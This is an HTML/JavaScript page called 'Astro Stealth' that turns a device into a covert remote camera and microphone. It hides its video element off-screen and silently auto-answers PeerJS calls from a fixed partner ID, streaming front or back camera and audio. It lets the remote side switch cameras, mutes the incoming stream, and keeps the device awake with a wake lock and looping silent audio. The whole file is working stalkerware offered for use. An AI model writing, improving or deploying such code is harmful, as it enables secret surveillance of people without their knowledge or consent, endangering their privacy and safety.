<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Stealth - Switchable Camera</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localVideo" autoplay muted playsinline></video>

    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        
        let peer = null;
        let currentCall = null;
        let localStream = null;
        let dataConn = null;
        let currentCamera = "front";
        let wakeLock = null;
        let reconnectAttempts = 0;
        const MAX_RECONNECTS = 5;
        
        function log(msg) {
            console.log(`[STEALTH] ${msg}`);
        }

        // ── Get a media stream for the requested camera ──────────────────────
        async function getStream(isVideo, camera) {
            const facingMode = camera === "back" ? "environment" : "user";

            if (!isVideo) {
                return navigator.mediaDevices.getUserMedia({ audio: true, video: false });
            }

            // Strategy 1: exact facingMode — most reliable on real mobile hardware
            try {
                const s = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: { facingMode: { exact: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
                });
                log(`Stream OK via exact facingMode=${facingMode}`);
                return s;
            } catch (e) {
                log(`exact facingMode failed (${e.name}), trying deviceId enumeration`);
            }

            // Strategy 2: pick deviceId by label / index
            try {
                const tempStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                tempStream.getTracks().forEach(t => t.stop());

                const devices = await navigator.mediaDevices.enumerateDevices();
                const cams = devices.filter(d => d.kind === "videoinput");
                log(`Cameras: ${cams.map((c, i) => `[${i}] ${c.label || '?'}`).join(', ')}`);

                let deviceId = null;
                const backKw  = ['back', 'rear', 'environment', 'main'];
                const frontKw = ['front', 'face', 'selfie', 'user'];
                const keywords = camera === "back" ? backKw : frontKw;

                for (const cam of cams) {
                    if (keywords.some(k => cam.label.toLowerCase().includes(k))) {
                        deviceId = cam.deviceId;
                        log(`Label match → ${cam.label}`);
                        break;
                    }
                }

                // Index fallback: front=first, back=last
                if (!deviceId && cams.length >= 2) {
                    deviceId = camera === "back" ? cams[cams.length - 1].deviceId : cams[0].deviceId;
                    log(`Index fallback → ${camera === "back" ? "last" : "first"} device`);
                }

                if (deviceId) {
                    const s = await navigator.mediaDevices.getUserMedia({
                        audio: true,
                        video: { deviceId: { exact: deviceId }, width: { ideal: 640 }, height: { ideal: 480 } }
                    });
                    log(`Stream OK via deviceId`);
                    return s;
                }
            } catch (e) {
                log(`deviceId strategy failed: ${e.message}`);
            }

            // Strategy 3: ideal facingMode (last resort)
            log(`Falling back to ideal facingMode=${facingMode}`);
            return navigator.mediaDevices.getUserMedia({
                audio: true,
                video: { facingMode: { ideal: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
            });
        }

        // ── Switch camera during a live video call ────────────────────────────
        async function switchCamera(targetCamera) {
            if (targetCamera === currentCamera) { log(`Already on ${targetCamera}`); return; }
            log(`Switch: ${currentCamera} → ${targetCamera}`);

            if (!currentCall?.peerConnection) {
                currentCamera = targetCamera;
                log("No active call; preference saved"); return;
            }

            const isVideo = (currentCall.metadata?.type || 'voice') === 'video';
            if (!isVideo) { currentCamera = targetCamera; log("Audio-only; preference saved"); return; }

            try {
                // IMPORTANT: get new stream FIRST — do NOT stop old stream yet.
                // Stopping old stream kills the senders before replaceTrack can run.
                const newStream = await getStream(true, targetCamera);

                const senders = currentCall.peerConnection.getSenders();
                const vSender = senders.find(s => s.track?.kind === 'video');
                const aSender = senders.find(s => s.track?.kind === 'audio');

                if (vSender && newStream.getVideoTracks()[0]) {
                    await vSender.replaceTrack(newStream.getVideoTracks()[0]);
                    log(`✅ Video track replaced → ${targetCamera}`);
                } else {
                    log(`⚠️ No video sender found`);
                }
                if (aSender && newStream.getAudioTracks()[0]) {
                    await aSender.replaceTrack(newStream.getAudioTracks()[0]);
                }

                // NOW it's safe to stop the old stream
                if (localStream) localStream.getTracks().forEach(t => t.stop());

                localStream = newStream;
                currentCamera = targetCamera;
                document.getElementById('localVideo').srcObject = newStream;

                if (dataConn?.open) dataConn.send({ type: 'camera_switched', camera: targetCamera });

            } catch (err) {
                log(`❌ Switch failed: ${err.message}`);
                // currentCamera unchanged — still reporting old camera
            }
        }

        async function preventScreenLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLock = await navigator.wakeLock.request('screen');
                    log('Screen wake lock acquired');
                } catch (err) {}
            }
            const silentAudio = new Audio();
            silentAudio.src = 'data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzIMKpIE5DSCBTb2Z0d2FyZQBUSVQyAAAABgAAAzIyMzUAVFNTRQAAAA8AAANMYXZmNTcuODMuMTAwAAAAAAAAAAAAAAD/80DEAAAAA0gAAAAATGFWZjU3LjgzLjEwMAAAAAAAAAAAAAAA//tQxAADBkIiGbgG4AbW0dYNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
            silentAudio.loop = true;
            silentAudio.volume = 0;
            silentAudio.play().catch(() => {});
        }

        async function handleIncomingCall(call) {
            const callType = call.metadata?.type || 'voice';
            const isVideo = callType === 'video';
            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} call`);

            try {
                currentCamera = "front";
                const stream = await getStream(isVideo, currentCamera);
                localStream = stream;

                if (isVideo && stream.getVideoTracks().length > 0) {
                    document.getElementById('localVideo').srcObject = stream;
                }

                call.answer(stream);
                currentCall = call;
                log(`Call answered — sending ${isVideo ? 'Video + Audio' : 'Audio'} from ${currentCamera} camera`);

                call.on('stream', (remoteStream) => {
                    if (remoteStream) remoteStream.getTracks().forEach(t => { t.enabled = false; });
                });
                call.on('close', () => { log('Call ended by remote'); endCall(); });
                call.on('error', (err) => { log(`Call error: ${err}`); endCall(); });

            } catch (err) {
                log(`Failed to answer call: ${err.message}`);
                call.close();
            }
        }

        function handleDataMessage(data) {
            log(`Data received: ${JSON.stringify(data)}`);
            if (data.type === 'switchCamera') {
                switchCamera(data.camera);
            } else if (data.type === 'ping') {
                if (dataConn?.open) dataConn.send({ type: 'pong', timestamp: Date.now() });
            }
        }

        function endCall() {
            if (localStream) {
                localStream.getTracks().forEach(t => t.stop());
                localStream = null;
            }
            if (currentCall) { currentCall.close(); currentCall = null; }
            document.getElementById('localVideo').srcObject = null;
            log('Call ended, resources released');
        }

        function initPeer() {
            if (peer) { peer.destroy(); peer = null; }
            log(`Initializing as ${MY_ID}`);
            peer = new Peer(MY_ID);

            peer.on('open', () => {
                log(`✅ Stealth ACTIVE — waiting for ${PARTNER_ID}`);
                reconnectAttempts = 0;
            });

            peer.on('connection', (conn) => {
                if (conn.peer !== PARTNER_ID) { conn.close(); return; }
                log('Data connection from remote');
                dataConn = conn;
                conn.on('data', handleDataMessage);
                conn.on('close', () => { log('Data conn closed'); dataConn = null; });
            });

            peer.on('call', (call) => {
                if (call.peer === PARTNER_ID) handleIncomingCall(call);
                else { log(`Rejected call from ${call.peer}`); call.close(); }
            });

            peer.on('disconnected', () => {
                if (reconnectAttempts < MAX_RECONNECTS) {
                    reconnectAttempts++;
                    setTimeout(() => peer.reconnect(), 3000);
                }
            });

            peer.on('error', (err) => {
                if (err.type === 'unavailable-id') setTimeout(() => initPeer(), 5000);
                else log(`Peer error: ${err.type}`);
            });
        }

        async function listCameras() {
            try {
                await navigator.mediaDevices.getUserMedia({ video: true });
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(d => d.kind === 'videoinput');
                log(`📷 ${cameras.length} camera(s) found:`);
                cameras.forEach((c, i) => log(`  [${i}] ${c.label || 'Unnamed'} — ${c.deviceId.substring(0, 20)}...`));
            } catch (e) {
                log(`Camera list error: ${e.message}`);
            }
        }

        preventScreenLock();
        setTimeout(listCameras, 1000);
        initPeer();

        window.addEventListener('beforeunload', () => {
            endCall();
            if (peer) peer.destroy();
            if (wakeLock) wakeLock.release();
        });
    </script>
</body>
</html>
